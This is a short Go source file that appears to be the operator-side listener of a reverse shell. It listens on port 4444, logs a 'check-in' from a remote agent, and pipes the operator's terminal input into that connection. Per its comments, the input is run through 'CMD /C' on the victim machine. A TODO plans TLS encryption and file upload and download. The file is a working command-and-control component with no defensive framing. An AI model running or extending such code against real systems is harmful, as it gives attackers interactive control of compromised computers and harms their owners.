// TODO: Encrypt with TLS. Add additonal features. Upload/Download?
package main

import (
	"io"
	"log"
	"net"
	"os"
)

type transfer struct {
	bytes uint64
}

func main() {
	ln, err := net.Listen("tcp", "10.0.0.12:4444")
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Waiting for Check-in")
	con, err := ln.Accept()
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Check-in from:[%s]!", con.RemoteAddr())
	Streams(con)
}

func Streams(con net.Conn) {
	c := make(chan transfer) // create a channel

	// Read from Reader and write to Writer until EOF
	copy := func(r io.ReadCloser, w io.WriteCloser) {
		defer func() {
			r.Close()
			w.Close()
		}()
		n, err := io.Copy(w, r)
		if err != nil {
			log.Printf("[%s]: ERROR: %s\n", con.RemoteAddr(), err)
		}
		c <- transfer{bytes: uint64(n)} // this is the struct that was defined in the beginning - sends progress into a channel - VAR n = Copy r/w
	}

	go copy(con, os.Stdout) // starts a go routine - copies con (accepted connection) to os.Stdout
	go copy(os.Stdin, con)  // starts a go routine - copies os.Stdin to con - in this case "CMD /C" as defined on agent side

	p := <-c
	log.Printf("[%s]: Connection has been closed by remote peer, %d bytes has been receiv\n", con.RemoteAddr(), p.bytes)
	p = <-c
	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", con.RemoteAddr(), p.bytes)
}
